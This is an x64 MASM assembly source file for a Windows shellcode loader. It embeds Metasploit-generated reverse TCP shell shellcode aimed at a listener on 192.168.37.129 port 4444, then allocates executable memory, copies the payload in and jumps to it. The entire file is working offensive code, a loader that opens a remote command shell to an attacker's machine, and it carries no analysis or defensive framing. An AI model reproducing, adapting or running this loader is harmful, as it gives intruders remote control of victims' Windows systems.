; windows_loader64bits_shellreversetcp.asm

extrn VirtualAlloc :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC
extrn ExitProcess :PROC

.data
    ; msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp lhost=192.168.37.129 lport=4444 -f masm
    shellcode DB 0fch,48h,83h,0e4h,0f0h,0e8h,0c0h,00h
DB 00h,00h,41h,51h,41h,50h,52h,51h
DB 56h,48h,31h,0d2h,65h,48h,8bh,52h
DB 60h,48h,8bh,52h,18h,48h,8bh,52h
DB 20h,48h,8bh,72h,50h,48h,0fh,0b7h
DB 4ah,4ah,4dh,31h,0c9h,48h,31h,0c0h
DB 0ach,3ch,61h,7ch,02h,2ch,20h,41h
DB 0c1h,0c9h,0dh,41h,01h,0c1h,0e2h,0edh
DB 52h,41h,51h,48h,8bh,52h,20h,8bh
DB 42h,3ch,48h,01h,0d0h,8bh,80h,88h
DB 00h,00h,00h,48h,85h,0c0h,74h,67h
DB 48h,01h,0d0h,50h,8bh,48h,18h,44h
DB 8bh,40h,20h,49h,01h,0d0h,0e3h,56h
DB 48h,0ffh,0c9h,41h,8bh,34h,88h,48h
DB 01h,0d6h,4dh,31h,0c9h,48h,31h,0c0h
DB 0ach,41h,0c1h,0c9h,0dh,41h,01h,0c1h
DB 38h,0e0h,75h,0f1h,4ch,03h,4ch,24h
DB 08h,45h,39h,0d1h,75h,0d8h,58h,44h
DB 8bh,40h,24h,49h,01h,0d0h,66h,41h
DB 8bh,0ch,48h,44h,8bh,40h,1ch,49h
DB 01h,0d0h,41h,8bh,04h,88h,48h,01h
DB 0d0h,41h,58h,41h,58h,5eh,59h,5ah
DB 41h,58h,41h,59h,41h,5ah,48h,83h
DB 0ech,20h,41h,52h,0ffh,0e0h,58h,41h
DB 59h,5ah,48h,8bh,12h,0e9h,57h,0ffh
DB 0ffh,0ffh,5dh,49h,0beh,77h,73h,32h
DB 5fh,33h,32h,00h,00h,41h,56h,49h
DB 89h,0e6h,48h,81h,0ech,0a0h,01h,00h
DB 00h,49h,89h,0e5h,49h,0bch,02h,00h
DB 11h,5ch,0c0h,0a8h,25h,81h,41h,54h
DB 49h,89h,0e4h,4ch,89h,0f1h,41h,0bah
DB 4ch,77h,26h,07h,0ffh,0d5h,4ch,89h
DB 0eah,68h,01h,01h,00h,00h,59h,41h
DB 0bah,29h,80h,6bh,00h,0ffh,0d5h,50h
DB 50h,4dh,31h,0c9h,4dh,31h,0c0h,48h
DB 0ffh,0c0h,48h,89h,0c2h,48h,0ffh,0c0h
DB 48h,89h,0c1h,41h,0bah,0eah,0fh,0dfh
DB 0e0h,0ffh,0d5h,48h,89h,0c7h,6ah,10h
DB 41h,58h,4ch,89h,0e2h,48h,89h,0f9h
DB 41h,0bah,99h,0a5h,74h,61h,0ffh,0d5h
DB 48h,81h,0c4h,40h,02h,00h,00h,49h
DB 0b8h,63h,6dh,64h,00h,00h,00h,00h
DB 00h,41h,50h,41h,50h,48h,89h,0e2h
DB 57h,57h,57h,4dh,31h,0c0h,6ah,0dh
DB 59h,41h,50h,0e2h,0fch,66h,0c7h,44h
DB 24h,54h,01h,01h,48h,8dh,44h,24h
DB 18h,0c6h,00h,68h,48h,89h,0e6h,56h
DB 50h,41h,50h,41h,50h,41h,50h,49h
DB 0ffh,0c0h,41h,50h,49h,0ffh,0c8h,4dh
DB 89h,0c1h,4ch,89h,0c1h,41h,0bah,79h
DB 0cch,3fh,86h,0ffh,0d5h,48h,31h,0d2h
DB 48h,0ffh,0cah,8bh,0eh,41h,0bah,08h
DB 87h,1dh,60h,0ffh,0d5h,0bbh,0f0h,0b5h
DB 0a2h,56h,41h,0bah,0a6h,95h,0bdh,9dh
DB 0ffh,0d5h,48h,83h,0c4h,28h,3ch,06h
DB 7ch,0ah,80h,0fbh,0e0h,75h,05h,0bbh
DB 47h,13h,72h,6fh,6ah,00h,59h,41h
DB 89h,0dah,0ffh,0d5h
    endShellcode    DB 0
    hProcess        DQ ?
    baseAddr        DQ ?
    sizeShellcode   DQ ?

.code
Start PROC
    SUB     rsp, 28h
    DB 0CCh
    XOR     rcx, rcx
    MOV     rdx, 100h
    MOV     r8, 1000h ; MEM_COMMIT
    MOV     r9, 40h ; PAGE_EXECUTE_READWRITE
    CALL    VirtualAlloc
    MOV     baseAddr, rax

    CALL    GetCurrentProcess
    MOV     hProcess, rax

    LEA     r10, shellcode
    LEA     r11, endShellcode
    SUB     r11, r10
    MOV     sizeShellcode, r11

    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, sizeShellcode
    SUB     rsp, 40 
    MOV     qword ptr [rsp+32], 0
    CALL    WriteProcessMemory
    ADD     rsp, 40

    CALL    baseAddr

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess

Start ENDP
END